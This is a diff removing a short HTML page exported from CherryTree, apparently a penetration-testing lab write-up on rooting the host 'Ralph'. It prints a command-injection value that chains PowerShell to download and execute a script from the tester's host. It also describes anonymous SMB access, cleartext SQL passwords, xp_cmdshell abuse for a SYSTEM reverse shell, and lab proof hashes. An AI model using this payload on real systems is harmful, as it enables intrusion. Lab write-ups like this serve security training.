@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>10.11.1.31 Ralph rooted</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>10.11.1.31 Ralph rooted</h1><br/>A nmap scan showed that http, smb, sql, and rdp ports were all open.<br />Upon smb enumeration the tester (Chris) found that he was able to anonymously connect to the smb directory \\10.11.1.31\wwwroot.<br />Chris connected to the wwwroot directory and mirrored the directories onto his local machine.<br />Upon research of the new data he found two vulnerabilities. Onc involving a low privlidge shell due to a lack of input sanitization on pingit.py.<br />Chris was able to bypass the purpose of the script by inputing the following... 192.168.119.167 &amp;&amp; powershell.exe -c &quot;IEX(new-object net.webclient).downloadstring(&#39;<a href="http://192.168.119.167:80/443.ps1')"">http://192.168.119.167:80/443.ps1&#39;)&quot;</a><br />This command immediatley gave Chris a low privlidge shell on Ralph.<br />The second vulnerability noted was clear test passwords for SQLOLEDB located in the scripts named login-off.asp and login-off.asp.txt.<br />After logging into sql server chris was able to leverage xp_cmdshell to run a powershell command and give himself a reverse shell as nt authority\system<br /><br /><br />network-secret<br />7eab8563146f16140c769072580cbcb3<br />proof<br />dec04ea1c0d39acd7a53c543540b0a3a</div></body></html>
